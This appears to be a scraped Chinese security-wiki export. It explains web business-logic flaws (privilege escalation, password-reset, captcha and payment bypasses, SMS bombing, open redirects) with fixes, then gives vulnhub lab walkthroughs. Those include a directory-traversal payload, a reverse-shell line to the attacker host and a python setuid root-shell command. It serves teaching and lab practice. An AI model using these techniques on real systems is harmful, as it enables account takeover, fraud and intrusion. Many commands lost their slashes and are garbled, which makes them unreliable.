分类水平越权：相同级别（权限）的用户或者同一角色中不同的用户之间，可以越权访问、修改或者删除其他用户信息的非法操作。如果出现此漏洞，可能会造成大批量数据的 泄露，严重的甚至会造成用户信息被恶意篡改。 **水平越权：**指攻击者尝试访问与他拥有相同权限的用户资源。例如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的这种行为就叫做水平越权访问 垂直越权 ：就是不同级别之间的用户或不同角色之间用户的越权，比如普通用户可以执行管理员才能执行的功能。 垂直越权：由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。 产生原因水平越权和垂直越权的定义不一样，但漏洞原理是一样的，都是账户体系上在判断权限时不严格导致存在绕过漏洞，这一类的绕过通常发生在cookie验证不严、简单判断用户提交的参数，归根结底，都是因为这些参数是在客户端提交，服务端未严格校验。 1.通过隐藏URL 实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。 2.直接对象引用 这种通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。 3.多阶段功能 多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。 当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改密码。 4.静态文件 很多网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。 5.平台配置错误 一些程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。 修复建议1、前后端同时对用户输入信息进行校验，双重验证机制 2、 执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限 3、特别敏感操作可以让用户再次输入密码或其他的验证信息。 4、可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。 或在 session、cookie 中加入不可预测、不可猜解的 user 信息。 5、直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理 6、永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤 密码重置漏洞概念什么是密码重置？ 顾名思义，就是修改掉原来的密码；密码重置的途径有哪些？ 1、一个网站，一般我们可以登录进入个人中心，直接修改密码； 2、当我们忘记密码是还可以使用系统自带的密码找回功能进行密码修改； 什么是密码重置漏洞？ 密码重置这个功能本身没有问题，但如过对密码重置功能的验证机制不够完善就形成了漏洞； 成因一、基于修改密码的 如果后台没有对旧密码进行验证，就直接让输入新密码 1、第一种方式，如果存在CSRF漏洞，我们就可以利用一波; 2、如果存在越权漏洞，就可以直接修改其他人的密码; 3、点击修改后抓包测试，观察数据库包有没有验证类似cookie随机数，如果没有的话，可以尝试修改用户名、手机号或者uid来尝试重置其他密码; 如果后台是通过向注册手机或者注册邮箱来重置密码的，关于验证码的漏洞我们都可以尝试，这种方式的前提是你已经通过某种方式进入到了对方的个人中心，所以意义不太大. 二、基于找回密码的 一般情况下当我们点击找回密码的时候都是通过验证手机号或者验证邮箱，这就又变成了验 证码的问题; \\1.验证码发送后前端返回 \\2. 未限制验证码次数导致验证码爆破 \\3. 验证码有规律或可控 \\4. 验证码被放在返回包中 \\5. 输入验证码后通过修改响应包的状态来重置密码 \\6. 验证码为空（原理就是后台未考虑验证码为空的情况，直接就是如果存在，然后下面仅 判断了存在的情况）绕过或者万能验证码 \\7. 拦截数据包，发送验证码时可以向多个手机号发送验证码，这个时候就可以添加个云短信，直接接受验证码完成修改等等 密码找回漏洞密码找回是出现逻辑漏洞问题最多的一个功能，因为它的交互流程最多，目前找回密码的方式比较常见的有邮箱验证码、手机验证码以及密保问题， 1.输入用户名邮箱收机阶段 交互过程：即输入要重置的账号信息，点击确定时，大部分应用会直接从数据库中读取用户邮箱和手机信息，并且发送验证码，还有部分程序在输入用户名后，会提示使用手机还是邮箱找回密码。 在提交的时候可以直接抓包修改手机或者邮箱参数，这时如果后端没有做验证，原本发送给账号A的验证码就会发送到被我们篡改的手机或者邮箱上，利用接收到的验证码即可重置密码。 2.填写验证码和新密码阶段 填写验证码和新密码就意味着我们已经拿到了验证码或者重置密码的URL，这里存在的 主要问题有： （1）验证凭证较简单，可以暴力破解。 目前大多数手机短信重置密码的验证码都是4位或者6位数字，如果提交验证码的地方没有对这个验证码进行错误次数限制，则会存在可以爆破的问题，这是目前最常见的一种找回密码漏洞利用方式。 （2）验证凭证算法简单，凭证可预测。 部分网站找回密码的Token是根据当前用户的“用户名+邮箱”或者时间戳进行一次MD5后生成，这就存在一定得预测性，利用自己写的算法去碰撞即可拿到争取到的重置密码凭证。 （3）验证凭证直接保存在源码里。 目前这种比较少，不过也存在一定比例，一种是在点击发送验证码的时候就可以直接在源码里看到给当前用手机或者邮箱发送过去的验证码，还有一种是在输入验证码的时候， 源码里面就直接保存了正确的验证码。 3.发送新密码阶段 凭证未绑定用户：我们在找回密码的时候，发送到邮箱的链接通常是如下这个样子：http://www.xxx.com/user.php?m=repwduid=用户IDkey凭证密钥email邮箱 当请求这个链接的时候，后端程序根据uid和key对应上了从而判断这个找回密码的链接是否有效，但是在将新密码提交到服务器的时候，服务器端并没有判断当前这个key是否跟uid或者email匹配，而是直接修改掉了uid或者email指定的用户密码，这样我们只要拦截修改密码的请求包，将里面的用户参数修改成我们要篡改密码的用户账号即可。 修复建议1.接收验证码的邮箱和手机号不可由用户控制，应该直接从数据库中读取出来。 2.加强验证凭证复杂度，防止被暴力破解。 3.限制验证凭证错误次数，单个用户在半个小时内验证码错误三次，半小时内禁止找回密码。 4.验证凭证设置失效时间。 5.验证凭证不要保存在页面。 6.输入用户邮箱或ID、手机号取验证凭证的地方需要设置验证码防止短信炸弹和批量找回等。 7.验证凭证跟用户名、用户ID、用户邮箱绑定，找回密码时验证当前凭证是否是当前用户的。 验证码漏洞漏洞概念：验证码机制主要用于用户身份识别，常见可分为图片验证码、数字验证码、滑动验证码、短信验证码、邮箱验证码等； 漏洞成因：服务端未对验证时间、次数作出限制，存在爆破的可能性。验证码常用在批量注册，任意用户登录场景。 漏洞分类：1、前端验证绕过 原理：前端验证码绕过一般是前端JavaScript脚本生成验证码，验证的工作在前端进行； 思路：直接删除相对应的部份的代码即可，要求能够大概看懂前端的代码； 2、后端验证码未刷新 原理：后端绕过情况1：后端代码在逻辑上存在问题，验证失败时，验证码不过期，可以继续做认证（也算作逻辑漏洞）； 思路：这类情况需要Burp抓包测试验证； 实战：东塔攻防世界-后端验证码绕过 3、TOKEN验证可提取 思路：利用burp工具，可以每次自动提取后台返回的token值，用于下一次的爆破使用； 支付漏洞原理支付漏洞，是一种很简单的逻辑漏洞，通过抓包简单修改数据包即可实现。 世界上的公司分为俩种，一种是还没被黑客攻击过的，另一种就是已经被 黑客 攻击过的。 所以企业也越来越重视网络安全这块，这样的支付漏洞就那么好找了……. 商户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知； Ø 浏览器跳转 基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全性； Ø 服务器端异步通知 该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST或GET的方式。商户网站接收异部参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额、订单信息是否与发起支付时一致，验证正常则对订单进行状态处理或为用户进行网站内入账等； 分类1.修改支付价格 支付三步曲——订购、下单、付款 •三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可在最后一步付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么问题就会存在，其修改的金额值你可以尝试小数目或者尝试负数。 2.修改订单数量 很简单，就是本来一笔订单5块钱，可以尝试把订单修改为负数 3.修改附属值(优惠券) 优惠劵主要用来打折或者抵扣现金，一般用优惠劵进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品的价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么 问题就会产生，直接支付成功。 4.越权支付 例如：usernameXXXXX，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品； 5.无限制试用 在支付的时候它URL后面的支付接口是3，而试用接口是4，那么此时你已经使用过了，复制下确认试用时的URL，修改后面的支付接口为3，那么此时就会调用购买支付接口，但是由于你本身这个产品就是试用的，其相应值绑定了这个试用商品，那么金额就肯定是0，那么最后点击支付，你就可以看到支付成功，试用成功，又重复试用了一次，然后他们的试用时间会累加在一起，这就导致了可无限制购买任何产品了。 6.修改支付接口 一些网站支持很多种支付，比如自家的支付工具，第三方的支付工具，然后每个支付接口值不一样，如果逻辑设计不当，当我随便选择一个点击支付时进行抓包，然后修改其支付接口为一个不存在的接口，如果没做好不存在接口相关处理，那么此时就会支付成功； 7.多重替换 首先去产生两个订单，这两个订单商品是不一样的，其价格不一样，如果服务端没有做好这相关的验证，那么在支付的过程当中抓包，修改其订单值为另一个订单值，最后支付，这时就可以用订单一的支付价格买到订单而的商品； 防御Ø 后端检查每一项值，包括支付状态； Ø 校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量； Ø 与第三方支付平台检查，实际支付的金额是否与订单金额一致； Ø 支付参数进行MD5 加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题； Ø 金额超过阈值，进行人工审核 ； 投票积分抽奖漏洞投票和抽奖以及积分在很多促销活动或者推广手段上都经常用到，背后的奖品成本可能上数十万，如果这些奖品被恶意用户刷走了，不仅推广的效果没有，而且浪费了成本投入。 不管是投票、积分还是抽奖，都存在一个公共点：即单个用户次数存在限制，比如一场活动中一个用户只能抽奖一次。这样的限制也会存在很多绕过方式。 利用方法1.cookie和POST请求正文绕过 有的应用将验证是否抽奖或者领取积分的判断值放置在cookie或者POST的请求正文里，服务器端获取到这个结果后判断是否还有机会抽奖，而这个数据我们是可以直接在数据包中修改的，所以就会产生绕过，比如cookie中isok1代表已经抽奖，isok0代表还没有抽奖， 而我们只要再点击抽奖，然后把isok的值改为0即可一直抽奖。 2.基于IP验证 做的比较弱的统计是直接基于IP验证，像访问量、推广获取积分等，这类要看程序获取IP的方式，如果是client-ip或者x_forword_for获取IP，则可以直接伪造IP绕过。 3.基于用户认证 也有一部分应用需要登陆以后才能抽奖或者投票，这类可以结合看看能不能批量注册，如果可以，则可以用程序实现批量登陆刷票，或者投票的时候POST包或者cookie里面的当前uid\\ 用户名等是否可以随意修改绕过用户单次限制。 防御方法从上面利用手段可以看到主要的三个点是IP、登录用户和cookie、分析出可用性较高的防御 手段如下： Ø 机器识别码验证，每台机器都可以根据硬件信息生成唯一的识别码。 Ø 操作需要登陆，当前用户信息从session中读取。","tags":[null]},{"title":"挖掘流程","path":"/wiki/Web知识点/逻辑越权/挖掘流程.html","content":"逻辑漏洞挖掘逻辑漏洞#逻辑漏洞是指由于程序逻辑输入管控不严或者逻辑太复杂，导致程序不能够正常处理或处理错误，逻辑漏洞根据功能需求的不同产生的漏洞方式也不同。一般出现在网站程序的登录注册、密码找回、验证方式、信息查看、交易支付金额等地方。 这类漏洞不同于常见WEB漏洞，常见WEB漏洞都可以总结为一定的范式，而逻辑漏洞不行 逻辑漏洞出现的原因也是有很多种，需要有一定个人经验积累才能在代码审计过程中发现此类漏洞 挖掘思路#首先将所有逻辑漏洞的问题分为前端和后端两个部分，先测试绕过前端规则限制再测试绕过后端规则限制，一般情况下只要能够突破原有规则限制的都就可以算是漏洞。 挖掘逻辑漏洞总体步骤分为以下三步： 明确业务逻辑流程，根据业务需求的特点，有针对性的进行测试。 寻找流程中可以被操控的环节，分析可被操控环节中可能产生的逻辑问题。 珠宝修改参数触发逻辑问题，重放包对比结果差异。 业务逻辑漏洞#- 登录模块# 暴力破解 任意用户密码登陆 短信邮箱轰炸 验证码绕过爆破重放回传 用户名手机号枚举 越权登陆（例如修改数据包中用户ID） 账号权限绕过（越权） Cookie伪造 用户空密码登陆 注册模块# 前端验证绕过 用户任意批量注册 恶意验证注册账户 账户重复注册 用户名绑定手机号枚举 注册信息插入XSS 短信邮箱轰炸 验证码绕过爆破重放回传 其他验证机制绕过 密码找回# 任意批量用户密码重置 任意邮箱手机号验证（验证码与绑定用户未统一验证） 用户绑定手机号枚举 新密码劫持 短信验证码劫持绕过回传爆破重放 用户邮箱劫持篡改 其他验证机制绕过 购买支付充值# 商品金额数量篡改 替换支付模块 交易信息泄露 虚假充值金额 充值账户金额数量篡改 支付验证绕过 整数溢出，int最大值为2147483647 修改本地JS或服务端返回的数据包中的关键值 个人资料# 手机号用户邮箱枚举 修改个人资料插入XSS 邮箱用户手机号篡改 用户信息遍历泄露 越权修改他人账户资料 抽奖活动# 任意抽奖 盗刷奖品积分 抽奖积分次数篡改 并发抽奖 邀请码XSS（验证码URL可能包含用户名，可将用户名修改为XSS代码） 代金券优惠券# 批量刷取代金券优惠券 更改代金券金额数量 更改优惠券数量 并发逻辑漏洞（burp批量获取优惠劵等） 订单# 订单信息遍历泄露 订单信息泄露导致用户信息泄露 越权修改删除他人订单 账户# 账户验证绕过 账户金额篡改 账户绑定手机号绕过 账户第三方账户绑定绕过 会员系统# 用户越权操作访问 个人资料信息遍历泄露 修改个人信息头像上传任意文件 如果遇到xlsxdocx，可能存在XXE，上传恶意文档盲测 修改个人信息页面插入XSS 传输过程# POSTCookie注入 cookie劫持 修改信息处无sessiontoken导致CSRF 明文传输账号密码 评论模块# POST注入 无sessiontoken导致CSRF 评论时插入XSS 遍历用户ID导致用户信息泄露 恶意批量刷评论数量 第三方系统# 第三方系统未授权访问 第三方账户信息遍历 第三方账户越权访问 第三方账户信息泄露 第三方应用版本漏洞 验证码安全# 验证码参数删除绕过 验证码生成规律预测 验证码图像内容可被工具识别 验证码长期不失效，进行爆破 验证码回显到页面或者数据包中 单个验证码可多次重复利用 短信验证码与手机号未统一验证 短信验证码未对单个手机号发送次数进行限制 短信验证码未做发送时间限制，导致短信轰炸 可能存在万能验证码 接口调用# 未授权访问敏感数据接口 短信api接口泄露被恶意调用 数据库接口泄露，导致数据可被恶意操作 逻辑漏洞利用#验证码#万能验证码： 程序员在开发验证码模块时，为了方便调用验证码验证功能是否完善，故意设置了几个万能的验证码作为测试数据。在开发结束后由于程序员的疏忽，没有删除该测试验证码数据从而导致该漏洞的产生。 验证码回传： 通过抓包的方式，可以看到验证码内容回显在了数据包中；或者通过查看网页源代码可以看到验证码中的内容，导致正确验证码可以被直接读取利用到。 删除验证码绕过： 通过抓包将验证码的值删除或者直接删除验证码参数，然后将修改后的数据包进行重放导致验证码验证被绕过。 验证码爆破： 此处验证码爆破通常是指手机短信验证的方式，由于没有对输入同一个验证码的次数做限制，并且验证码的内容太简单，例如4位或者6位的纯数字组成。可以通过Burp的Intruder模块对验证码内容进行爆破，直到匹配到正确的验证码。 验证码重放 首先，输入错误的验证码，进行抓包重放一次，观察验证的返回的数据包内容，再用正确的验证码再进行抓包重放，对比两个数据包的差异，然后根据这些差异验证码是否失效。 然后将正确的验证码发送至Burp的Intruder模进行不断的重放，比较这些数据包是否都是正确验证码时返回的一样内容，如果数据包内容一样说明存在验证码重放的漏洞。 验证码与手机号未统一匹配 首先用自己的手机收到正确验证码，在点击注册时拦截包将手机号改为其他手机号，如果成功的话就注册了别人的手机号，这是因为后端仅验证了验证码是否是正确的而没有验证验证码是否与手机匹配。 短信轰炸#尝试不断重放发送验证码的数据包，查看手机是否在短时间内收到了多条短信，是的话则存在短信轰炸漏洞，这是因为后端没有对发送手机短信做时间次数限制。 如果后端对短信验证码做了限制，那么可以尝试以下几种方式进行绕过： 删除修改cookie或者返回值，重放数据包 遍历参数发送数据包 对参数进行叠加 手机号后面加空格(%20)或者前面加其他的比如+86、逗号、分号、字母等 请求参数修改大小写，或者添加请求参数id1 多接口测试，可能登陆位置做了防护，但密码找回出没有防护 利用调用接口绕过短信轰炸限制 修改IP绕过短信轰炸限制 添加重复的手机号参数，重放数据包 越权操作#首先用一个账号登陆系统后，通过抓包修改用户参数，可以达到查看或者修改他人账号的目的，尽量对多接口或者多功能模块进行不断测试越权操作。同时也要多个账号登陆，分析对比这些账号数据包中的请求参数差异，通过修改这些存在差异的参数，看看是否能够达到越权操作的目的。 越权漏洞又分为平行越权，垂直越权和交叉越权。 平行越权：权限类型不变，权限ID改变 垂直越权：权限ID不变，权限类型改变 交叉越权：即改变ID，也改变权限 用户信息泄露#可能存在用户个人信息页面、密码找回处以及各种调用到用户信息数据的地方，通过抓包查看返回信息是否加载了一些敏感的数据信息，比如查询用户信息的时候也将用户的密码数据在数据包中回显了；或者在用户个人资料页面，通过抓包修改用户ID参数，可以通过遍历查询到其他账号的用户资料，导致用户信息泄露； 任意用户密码重置#通常发生在忘记密码处，由于系统没有严格匹配用户忘记密码时的验证方式，通过抓包修改用户参数，导致任意用户的密码都能够被重置。 比如某个忘记密码功能处采用手机号短信验证的方式来重置用户密码，如果该验证手机号没有对用户账户进行绑定，那么就可以通过输入任意手机号接收短信验证，然后就可以利用该验证码重置用户密码了。 订单金额任意修改#很多中小型的购物网站都存在订单金额任意修改漏洞。在提交订单的时候抓取数据包或者直接修改前端代码，然后对订单的金额任意修改。 经常见到的参数大多为：rmb 、value 、amount 、cash 、fee 、money 等 关于支付的逻辑漏洞这一块还有很多种思路，比如相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数等等。 未授权访问#有些业务的接口，因为缺少了对用户的登陆凭证的较验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。 一般容易出现在文件导出下载，JSON数据页面，第三方应用页面等位置。 常见案例： 某电商后台主页面，直接在管理员web路径后面输入main.php之类的即可进入。 某航空公司订单ID枚举 某电子认证中心敏感文件下载 某站越权操作及缺陷，其主要原因是没对ID参数做cookie验证导致 实际上还有很多案例，他们都存在一个共同的特性，就是没有对用户的登陆凭证进行效验 接口无限制枚举#有些关键性的接口因为没有做验证或者其它预防机制，容易遭到枚举攻击。 常见案例： 某电商登陆接口无验证导致撞库 某招聘网验证码无限制枚举 某快递公司优惠券枚举 某电商会员卡卡号枚举 某超市注册用户信息获取 cookietoken设计存在缺陷#cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举。或者通过修改cookie中的某个参数可以登陆其他用户，即cookie仿冒。 token一般是操作令牌，每个用户在登录系统时，服务器会为每个用户生成token令牌作为操作凭证。如果token设计太过于简单，那么可能会被破解；或者token没有设置过期的时间，使得用户token不唯一，导致用户token存在被盗用的风险。 找回密码存在设计缺陷#auth设计缺陷 经常研究逻辑漏洞的人可能会对以下URL很熟悉 www.xxx.com/resetpassword.php?id=MD5 用户修改密码时，邮箱中会收到一个含有auth的链接，在有效期内用户点击链接，即可进入重置密码环节。而大部分网站对于auth的生成都是采用rand()函数，那么这里就存在一个问题了，Windows环境下rand()最大值为32768，所以这个auth的值是可以被枚举的。 如下面这个代码可以对auth的值做一个字典。 $a=0;for ($a=0;$a=32768;$a++) $b=md5($a); echo \\r ; echo $b; 然后重置某个账号，并且对重置链接内的auth进行枚举。 签约漏洞# 使用A手机登陆账号A打开要测试的业务，点击自动续费，支付时停留在支付界面。 使用B手机登陆账号A打开要测试的业务，点击自动续费，支付时停留在支付界面。 重复多台手机进行同样操作 A手机点击支付进行签约 A手机支付成功后，在第三方APP中解除自动续费 B手机进行支付，支付成功后在第三方APP中解除自动续费 全部支付完成后，系统就会为你开通相应的次数，由于提前打开了支付界面，所以金额都是享受到新用户首月优惠的金额。 最终的效果是，一个账户享受到了多次新用户首月优惠金额，即证明漏洞的存在。 通常这种漏洞比较容易出现在活动页面的会员优惠开通，而且要考虑到支付后要比正常购买优惠才算是漏洞。 会员升级# 使用A手机登陆账号A，并且开通会员。开通超级会员，进入到升级页面，进行补齐差价开通。 使用B手机登陆账号A，点击开通超级会员，进入到升级页面，进行补齐差价开通。 A手机进行支付，B手机进行支付。服务器认为你补齐了多个月份的超级会员，然后到账多次。 其实这个和签约漏洞的原理差不多，绕过了支付后服务器才去校验是否可以升级的逻辑。 订单关闭# 使用优惠券创建一个订单，停留在支付界面 关闭订单，返回优惠券 使用优惠券再次创建订单；把第一个未支付的订单进行支付 商品从关闭，重新进入到了代发货的阶段，优惠券却仍然存在，即证明漏洞存在 支付金额# 有些业务在支付时会忽略分以后的单位，这时候就导致了存在分单位的金额也可以生成订单 比如0.0190.02，在支付时客户端给服务器传了0.019元的订单。而第三方付支通常最小的单位为分 这就导致了返回的金额会吧后面的9屏蔽掉，只返回0.01（也有些直接四舍五入变成0.02的） 当你支付完0.01后，第三方会通知服务器支付成功，而服务器那边生成的是0.019，可能这个软件的侨胞最小单位也是分，四舍五入变成了0.02 int整数溢出# 注意：在做溢出测试时，有可能导致目标服务器宕机，需要向授权单位申请授权后才能进行测试。 int的范围是-2147483648~2147483647。你可以把它看作是一个循环，当超过最大值后就重新从0开始计算 比如2147483649-2147483647。有时候支付里面没有负数所以从0开始计算了 当支付金额为2147483649时，支付金额就变成了1，即2147483649-21474836481 支付的时候可以直接吧金额改成这个值，在测试商品时也可以让总价格为这个数。2147483648物品单价+1物品数量 以上的做法目的，简单的来说就是通过整数溢出来修改支付金额或者购买商品数量。 突破时间限制#一些网站中的限时活动设置了活动时间范围，可以通过抓包尝试更改时间参数为活动未限定范围内的。 前端验证#前端加密、后端解密校验。比如在用户登录时，通过抓包发现用户密码被加密传输了，可以利用一些解密工具进行破解，如：Burp解密或者一些在线解密网站。 暴力破解撞库#首先在没有验证码或者验证码可以被绕过的情况下，尝试5次或者10次账号密码登陆，检测目标是否封禁账户，如果没有封禁规则，可以不断进行爆破。采用账号密码爆破，对于一些商城、应用、政府、学校采用撞库方式判断是否存在该账号（需要准备各类字典：手机号撞库、邮箱撞库、姓名撞库）。 密码找回# 通过邮箱找回密码，访问链接重置密码，输入新密码后提交抓包，虽然有token，但是依然可以直接修改用户ID进而修改他人密码 通过他人手机号找回密码，抓包，将他人手机号替换为自己的手机号，获取验证码，提交后修改密码 通过自己手机号找回密码，获取验证码后抓包，将数据包中的用户ID改为他人账号ID，提交后成功修改他人密码 通过邮箱找回密码，URL链接中修改用户ID为他人，邮箱不变，之后通过链接可以将他人账户绑定为自己的邮箱，之后通过邮箱找回密码 任意url跳转#url跳转漏洞也叫开发重定向漏洞，可以把用户重定向到攻击者自己构造的页面去，简单的说就是可以跳转到任意指定的url。一般出现在验证跳转、sso登陆等位置。 服务端未对传入的跳转url变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。 危害： 网站钓鱼 配合CSRF操作危险请求 配合XSS执行JS盗取cookie 配合浏览器漏洞（CVE-2018-8174） http://www.xxx.com?url=https://www.baidu.com 替换url参数后能够跳转到对应页面，但是一些网站可能会对url跳转做限制，可以尝试绕过bypass 1.利用问号绕过限制,最终跳转到京东页面url=https://www.baidu.com?www.jd.com2.利用@绕过限制,最终跳转到京东页面url=https://www.baidu.com@www.jd.com3.利用斜杆反斜杠绕过限制4.利用#绕过限制url=https://www.baidu.com@www.jd.com5.利用子域名绕过6.利用畸形url绕过7.利用跳转IP绕过 支付逻辑漏洞#在支付环节中由于逻辑不严谨而产生的漏洞称为支付漏洞。 测试思路#只要有参数，都可以修改，都有可能出现问题。 通常使用两个账号来对比测试，这样可以更快发现可疑参数 订单模块# 下单之后修改商品价格 下单之后更改数量设为负数，产生正负逻辑 并发购买是否出现逻辑问题 商品为0，是否存在购买的可能 生成订单时修改订单金额 结算模块# 优惠券重复利用 修改结算状态 更改支付API或者支付模式 伪造成功结算请求 退货模块# 更改货物状态 更改退货价格 收货模块# 绕过客户直接确认收货 边界值问题#正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户 顺序执行缺陷#正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。 金额直接传输导致篡改#直接对下单的金额进行修改值，这里可以使用fd或者burp抓包 确定支付之后还可以加入购物车#把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。 请求重放#购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。 请求参数干扰#金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。 订单替换#订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。 欺诈#需要两个收款人，一个是正常的商家，一个是伪造的商家 单位替换#产生在paypal类似的国际支付的场景。 用户替换#在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西 强制攻击#强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。 秘钥泄漏#内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。13.函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。 修复建议# 生成数据签名，对用户金额和订单签名 敏感参数不要放在url中 服务端校验过滤客户端提交的参数 在服务端计算金额的时候，一定要判断是否为正数 支付过程中加一个服务器生成的key，用户校验参数有没有被篡改 用url传递相关参数，后端进行数字验证 订单金额和充值接口返回的数据进行校验 提交订单时后台判断单价是否与数据库中相符，若不符则返回数据 支付时应从服务器拉取数据，而不是直接读取客户端的值","tags":[null]},{"title":"文件包含","path":"/wiki/Web知识点/文件包含/index.html","content":"文件包含 点击阅读详细内容... 📝 文档"},{"title":"Toppo","path":"/wiki/WP/Windows提权/vulnhub/Toppo.html","content":"前提 kali ip 192.168.129.152 靶机 NAT 模式 信息收集检测ipnmap -sP 192.168.129.024 ip 是192.168.129.165 检测端口nmap -sT -sV -Pn 192.168.129.165 -p- -A 扫的太慢了的话，换这个nmap -sS -sV -Pn 192.168.129.165 -p- -A -sS 就是 TCP SYN 半连接扫描 22,80,111端口开放 渗透测试先看比较重要的80端口 80端口服务器是Apache 2.4.10 博客是start Bootstrap 搭建的 搜索Apache历史漏洞 这有点多了，ehole检测一下指纹信息，缩小选项 缩小不了，先看只有Apache的， 貌似失败了 searchsploit Bootstrap 只有xss，貌似不能getshell 目录扫描一波python dirsearch.py -u http://192.168.129.165/ 有个admin目录，查看一下 查看notes.txt 有一个密码，然后尝试访问一下，看有没有登陆处mail里什么都没有 http://192.168.129.165/vendor/ 这个好像是个目录,目录穿越失败 http://192.168.129.165/manual/en/index.html ok,网页端没有登陆界面111端口searchsploit rpcbind 好像都是dos攻击 没想到还有一个ssh登录，尝试一下密码是12345ted123，账号可能是ted尝试登陆 登陆成功 提权 这个就不用反弹shell了，当然，愿意的话也可以sh -i devtcp192.168.129.1525555 01 尝试sudo提权 查看etcpasswd只有一个用户 suid尝试查看是否有特权文件find -perm -us -type f 2devnull 尝试python2.7提权usrbinpython2.7 -c ‘import os; os.setuid(0); os.system(“binbash”)’","tags":[null]},{"title":"GeminiInc v1","path":"/wiki/WP/Windows提权/vulnhub/GeminiInc v1.html","content":"前提 kali 192.168.129.152 靶机 NAT模式 信息收集ip检测 nmap -sP 192.168.129.024 ip 为 192.168.129.166 端口检测nmap -sT -sV -Pn 192.168.129.166 -p- -A 只开放了22,80 渗透测试提权","tags":[null]},{"title":"vulnhub","path":"/wiki/WP/Windows提权/vulnhub/index.html","content":"devrandom Scream 点击阅读详细内容... 📝 文档 GeminiInc v1 点击阅读详细内容... 📝 文档 Kioptrix 2014 (#5) 点击阅读详细内容... 📝 文档 Toppo 点击阅读详细内容... 📝 文档"},{"title":"Kioptrix 2014 (#5)","path":"/wiki/WP/Windows提权/vulnhub/Kioptrix 2014 (#5).html","content":"前提kali ip 192.168.129.152信息收集ip收集nmap -sP 192.168.129.024 端口收集nmap -sT -sV -Pn -v 192.168.129.164 -p- -A 扫描到 22，80，8080， 但是22端口关闭了 看看udp 端口 nmap -sU -p- 192.168.129.164 无 渗透测试80端口 检查源代码 访问 ehole扫描指纹 Apache,FreeBSD,mod_ssl,mod_dav, | Apache2.2.21 (FreeBSD) mod_ssl2.2.21 OpenSSL0.9.8q DAV2 PHP5.3.8 扫秒是否有漏洞 查看内容目录穿越http://192.168.129.164/pChart2.1.3/examples/index.php?Action=ViewScript=%2f..%2f..%2fetc/passwd 有三个用户，但都不能登录，尝试内核漏洞 etcshadow 没有权限 